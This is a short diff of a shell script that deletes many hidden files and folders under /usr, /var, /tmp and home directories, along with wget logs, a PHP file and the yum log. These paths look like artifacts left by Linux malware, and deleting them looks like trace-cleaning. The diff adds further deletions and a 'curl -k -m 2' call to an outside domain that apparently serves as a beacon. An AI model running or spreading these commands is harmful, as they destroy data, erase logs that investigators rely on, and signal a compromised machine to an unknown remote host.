@@ -2,4 +2,9 @@
 rm -rf wget-log*  /usr/lib/.klibc-K8* /usr/.games_cache /var/log/yum.log
 rm -rf /usr/.123 /usr/.1233 /var/.lcc /var/.logg /var/.lccc /usr/123
 rm -rf /var/.log /var/.cssh /tmp/.cache /home/.hsperfdata_235f1a
+rm -rf /root/.wget-hsts ~/.wget-hsts /tmp/.hypre ~/wget-log*
+rm -rf  /var/tmp/.cache_hsperfdata 
+rm -rf /var/tmp/.syslog
+rm -rf /usr/.123 /usr/lib/.libc-K8*
 rm -rf /root/.wget-hsts ~/.wget-hsts /tmp/.hypre ~/wget-log* /var/tmp/.cache_hsperfdata /root/2.php
+curl -k -m 2 lshub.s.dlog.fun
